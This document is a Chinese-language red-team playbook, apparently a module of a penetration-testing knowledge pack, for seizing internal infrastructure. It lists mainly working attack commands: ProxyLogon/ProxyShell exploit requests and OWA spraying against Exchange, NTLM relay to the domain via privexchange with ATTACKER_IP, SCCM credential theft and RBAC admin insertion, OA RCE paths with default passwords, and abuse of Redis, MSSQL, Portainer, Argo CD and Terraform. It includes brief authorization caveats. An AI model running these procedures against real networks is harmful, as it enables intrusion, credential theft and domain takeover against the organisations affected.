# 内网基础设施打法

> 适用：内网可达面已建立（含经 `internal-06` 隧道），按"产品→默认弱点→验证动作"逐行对号，先拿下基础设施权限再回到域/横向主线。

## 认什么

- 端口一开就先对指纹，不猜：`whatweb`、`curl -sI`、`nmap -sV`，再看默认路径。
- 三类入口：**未授权 API**（不开凭据就能读）、**默认/弱口令**（admin/admin 系）、**版本型 N-day**（ProxyLogon、CVE-2024-31989 这类）。
- 高价值排序：Exchange ≈ SCCM > 数据库/中间件 > 容器/CI/镜像仓库/代码平台 > 国产 OA。
- 前提：目标可达（隧道/代理）且是真实业务系统；只打当前确认的实例，不按 FOFA 同皮全网撒。
- 拿到一台后，先问三个问题：配置文件里有什么凭据、本机有没有域会话、这台能否作为跳板——基础设施的价值在它信任的那些账号。

## 打哪（命令）

### 总表：产品 → 默认弱点 → 验证动作

| 产品 | 默认弱点 | 验证动作 |
|---|---|---|
| Exchange | OWA/ECP 暴露、未打 ProxyLogon/ProxyShell、OWA 可喷洒 | `/owa` `/ecp` `/autodiscover` 指纹；`curl -sk https://T/owa -D- \| grep -i x-owa-version`；nmap `http-ntlm-info` |
| SCCM/MECM | NAA/任务序列凭据、DP 匿名可读、Client Push 强制认证、site DB 可 relay | `nslookup -type=SRV _mssms_mp._tcp.DOMAIN`；`sccmhunter.py find`；`SCCMSecrets.py policies -mp http://MP` |
| 国产 OA | 历史 RCE/文件上传/未授权+默认口令 | 路径指纹 `/seeyon/` `/weaver/` `/ispirit/` `/servlet/~ic/`；`nuclei -tags oa,seeyon,weaver,tongda` |
| Redis 6379 | 未授权、`CONFIG` 可写目录 | `redis-cli -h T ping` → PONG；`CONFIG GET dir` |
| MSSQL 1433 | sa 弱口令、`xp_cmdshell` | `netexec mssql T -u sa -p '' --local-auth` |
| PostgreSQL 5432 | postgres 空/弱口令 | `psql -h T -U postgres -w` |
| MySQL 3306 | root 空/弱口令、UDF | `mysql -h T -u root --skip-password` |
| MongoDB 27017 | 无认证 | `mongosh --host T --eval "db.adminCommand('listDatabases')"` |
| Tomcat/WebLogic/JBoss | manager/console 弱口令、WAR 部署、AJP/T3 反序列化 | `/manager/html`、`/console`、8009 AJP、`/admin-console` |
| RabbitMQ | guest/guest 可远程、Management API 暴露 | `curl -u guest:guest http://T:15672/api/overview` |
| Portainer | admin 弱口令、JWT 后 Docker API | `curl -sk https://T:9443/api/status`；`POST /api/auth` |
| Harbor | `admin/Harbor12345`、公开项目、镜像层凭据 | `curl -sk https://T/api/v2.0/systeminfo`；`/v2/_catalog` |
| SonarQube | `admin/admin`、匿名可读源码 | `curl http://T:9000/api/server/version`；`curl -u admin:admin http://T:9000/api/authentication/validate` |
| Concourse | 匿名看 `main` Team、Fly 默认口令 | `curl https://T:8080/api/v1/pipelines`；`fly -t t login -c https://T:8080 -u admin -p admin` |
| Argo CD | `admin` 初始密码、Redis 6379 未授权、SSO/OIDC 绕过 | `curl https://T/api/v1/version`；`/api/v1/applications`、`/clusters` |
| Terraform | `tfstate` 明文凭据、`tfvars`、PR 改 `.tf` 触发 plan/apply RCE | `find / -name "*.tfstate*"`；`grep -iE "password\|secret\|token" terraform.tfstate` |
| Istio/Linkerd | Envoy Admin `localhost:15000`、控制面 CRD 可写 | Pod 内 `curl localhost:15000/config_dump`；`/etc/certs/` |

### Exchange（域内最高价值目标之一）

```bash
# 指纹与版本：15.0.x=2013，15.1.x=2016，15.2.x=2019
curl -sk https://T/owa -D- | grep -i "x-owa-version\|x-feserver"
# ProxyLogon CVE-2021-26855（+27065 写 webshell）
curl -sk "https://T/owa/auth/x.js" -H "Cookie: X-AnonResource=true; X-AnonResource-Backend=T/ecp/default.flt?~3" -D-
# ProxyShell CVE-2021-34473/34523/31207 / ProxyNotShell CVE-2022-41040
curl -sk "https://T/autodiscover/autodiscover.json?@evil.com/owa/?&Email=autodiscover/autodiscover.json%3F@evil.com"
# OWA 喷洒（域凭据：登录成功=拿到域用户）
spray -owa2 https://T/owa -u users.txt -p 'P@ssword123'
# GAL/OAB → 更多用户名；邮箱搜索：Invoke-SelfSearch -Terms "密码","VPN","key"
# Exchange → 域：Exchange Windows Permissions 默认对域有 WriteDACL
python3 privexchange.py -ah ATTACKER_IP T -u user -p 'Pass123' -d domain.local
ntlmrelayx.py -t ldap://DC_IP --escalate-user compromised_user
```

喷洒前先确认锁定阈值，单账号只试 1–2 次；`New-MailboxExportRequest` 导出属高危写操作，仅在授权范围与明确需求下做。

### SCCM/MECM（一次拿一批主机）

```bash
nslookup -type=SRV _mssms_mp._tcp.$DOMAIN   # MP；_mssms_sul = 软件更新点
sccmhunter.py find -u U -p P -d D -dc-ip DC
SharpSCCM.exe local site-info               # 已装客户端的主机
# NAA/策略凭据（注册新设备或复用已批设备）
python3 SCCMSecrets.py policies -mp "http://MP_IP" -u 'MACHINE$' -p PASS -cn newdevice
ntlmrelayx.py -t 'http://MP_IP/ccm_system_windowsauth/request' -smb2support --sccm-policies
SharpSCCM.exe get secrets -r newdevice -u 'MACHINE$' -p PASS
# DP 文件搜刮 / 本地 DPAPI
python3 cmloot.py DOMAIN/U@TARGET -findsccmservers
SharpDPAPI.exe SCCM        # 或 mimikatz: dpapi::sccm
# 横向：应用部署执行
SharpSCCM.exe exec -rid $RESOURCE_ID -r $TARGET
```

站点接管两条主路：① 站点机账号对 site DB 有 sysadmin → `ntlmrelayx.py -t "mssql://$SITE_DB"` relay 后 `mssqlclient.py`，再往 `RBAC_Admins` / `RBAC_ExtendedPermissions` 插管理员（`SMS0001R` + `SMS00ALL`/`SMS00001`/`SMS00004`）；② relay 到 `https://SMS_PROVIDER/AdminService/wmi/SMS_Admin`（`--adminservice`）。注意 **ConfigMgr 2509+ 默认拒绝 AdminService 上的 NTLM**，只能走 MSSQL 路径。

### 国产 OA（路径即指纹，默认口令先试）

| 系统 | 典型未授权/RCE 路径 | 默认口令 |
|---|---|---|
| 致远 Seeyon | `/seeyon/thirdpartyController.do`（任意登录）、`/seeyon/htmlofficeservlet`（上传）、`/seeyon/autoinstall.do.css`（反序列化）、`/seeyon/webmail.do`（SQLi） | `system/system`、`admin/seeyon123456` |
| 泛微 Weaver | `/mobile/browser/WorkflowCenterTreeData.jsp`（SQLi）、`/weaver/bsh.servlet.BshServlet`（RCE）、`/mobile/DBconfigReader.jsp`（配置读）、`/api/integration/workflowToDoc`（RCE） | `sysadmin/1` |
| 用友 NC | `/servlet/~ic/bsh.servlet.BshServlet`（反序列化）、`/servlet/FileReceiveServlet`（上传）、`/NCFindWeb`（遍历） | `admin/admin` |
| 通达 OA | `/ispirit/im/upload.php` + `/ispirit/interface/gateway.php`（上传+包含）、`/logincheck_code.php`（任意登录） | `admin/admin00` |
| 蓝凌 Landray | `/sys/ui/extend/varkind/custom.jsp`（SSRF→RCE/读文件）、`/sys/search/sys_search_main/sysSearchMain.do`（反序列化） | `admin/admin` |

万户/金蝶/红帆同类按指纹+默认口令+历史未授权路径走。OA 拿到 shell 后立刻收 `WEB-INF`/配置文件里的 DB 与域账号，它常在域内且权限偏高。

### 数据库与中间件

```bash
redis-cli -h T            # INFO server / CONFIG GET dir / dbfilename
# Redis 路径：写 webshell / SSH 公钥 / crontab；主从复制 RCE；Lua 沙箱逃逸
netexec mssql T -u sa -p '' --local-auth       # 默认组合：sa/sa、sa/空、sa/123456
impacket-mssqlclient DOMAIN/sa:PASS@T -windows-auth   # xp_cmdshell / OLE / Agent Job / CLR
# 中间件：8080 /manager/html（WAR）、7001 /console（T3/IIOP 反序列化）、
# 8009 AJP（Ghostcat 读文件）、8080/9990 JBoss /admin-console、4848 GlassFish、
# Apache CVE-2021-41773 路径穿越、Tomcat PUT 写 JSP
```

### 容器 / CI / 代码与镜像平台

```bash
# Portainer：9000/9443，/api/status → POST /api/auth 拿 JWT → /api/endpoints →
# /containers/create + /start + /wait，特权容器挂 / 后 chroot 宿主
# CVE-2024-29296（CE 2.19.4 用户枚举）；CVE-2018-12678（<=1.17 SSRF→RCE）
# Harbor：admin/Harbor12345 → /api/v2.0/projects、/v2/_catalog、docker login、
# service/token、Robot Account；镜像层里找 .env/私钥；Webhook/复制策略外带
# SonarQube：9000，admin/admin 或匿名；/api/authentication/validate →
# 项目源码 + issues + 用户 Token + Webhook（数据库/SCM 凭据在配置里）
# Concourse：8080/443/2222(TSA)/7777(Garden)/7788；/api/v1/info、/pipelines；
# fly get-pipeline → /vars 取 AK/SK、私钥；Worker Garden 7777 逃逸
# Argo CD：/api/v1/version、/applications、/clusters；CVE-2024-31989（<2.11.5
# Redis 缓存投毒→K8s 接管）、CVE-2022-29165（SSO）、CVE-2023-22482（OIDC）；
# 认证后建恶意 Application 部署特权 Pod
# Terraform：tfstate 里 secrets 明文；可写 .tf 用 local-exec provisioner RCE；
# Module 源替换；CI 里 PR 改 .tf 触发 plan/apply
# Service Mesh：istio-system/linkerd 命名空间；Envoy localhost:15000
# (/config_dump /clusters /certs)；/etc/certs/、/var/run/secrets/istio/；
# 可写 VirtualService/DestinationRule → 流量劫持；AuthorizationPolicy 删/改
# RabbitMQ：5672/15672/4369/25672；guest/guest 需 loopback_users=none；
# /api/overview、/api/users 看 tag；Shovel/Federation 外带；Erlang Cookie → RCE
```

## 什么算成

- 命令执行类：webshell/RCE 回显 `id`/`whoami` 是目标系统真实用户（不是教程回显），或能起回连。
- 未授权/凭据类：不登录（或默认口令登录后）读到**业务数据**——项目源码、队列消息、Pipeline 变量里的 AK/SK、镜像层里的配置密码、Exchange 邮箱内容。
- 数据库：能列业务库/表、读到应用配置表；Redis 能改 `dir`/`dbfilename` 并落文件。
- 平台类：拿到管理员会话（JWT/Session/Ticket），并能用其 API 完成一个写动作（部署应用、建 Robot Account、加 RBAC 管理员）。
- 能力证明停在"证明层"：只取一条能证明权限的数据/一个命令回显，不批量导出、不做破坏性操作。

## 假点

- 版本号对得上，但补丁回填/接口已下线/前置 WAF 拦；返回的是业务错误页不是漏洞特征。
- 401/403 当"未授权"；登录页 200 当"默认口令可用"。
- Redis `PONG` 但 `CONFIG` 被 rename/ACL 限制；MSSQL sa 能登但没有 `xp_cmdshell` 权限。
- Harbor 公开项目里没有敏感镜像；SonarQube 匿名只读 Quality Gate，读不到源码。
- SCCM 2509+ AdminService 拒 NTLM；只拿到普通 RBAC 角色无法部署应用。
- ArgoCD 初始密码已被改；Concourse 只暴露公开 Pipeline 名称，`/vars` 需要 Team 权限。
- OA 指纹命中但版本已修，或路径仅内网管理员网段可达（需先隧道）。
- 镜像仓库里拉到的 `.env` 是示例模板/占位符；凭据验证一次登录失败即否定。

## 与其他包联动

- 可达性：`internal-06`（隧道/代理）；域内定向前置：`internal-01`~`internal-05`。
- 基础设施拿到的凭据/hash → `internal-05` 横向、`internal-08` 持久化；本机提权 → `internal-07`。
- OA/中间件 Web 层细节按 `web-*` 包（上传/注入/反序列化/鉴权）；K8s/CI/云侧供应链 → `cloud-infra`。
- CVE 编号、影响版本、PoC 先查 `../../../../kb/`（`../../../../rules/55-kb-usage.md`）；"默认口令"只给已验证条目，不额外编造。
- 导出数据/改配置前读 `../../../../rules/20-min-harm.md`，证明层停手；证据与影响按 `../../../../rules/40-evidence-report.md`。
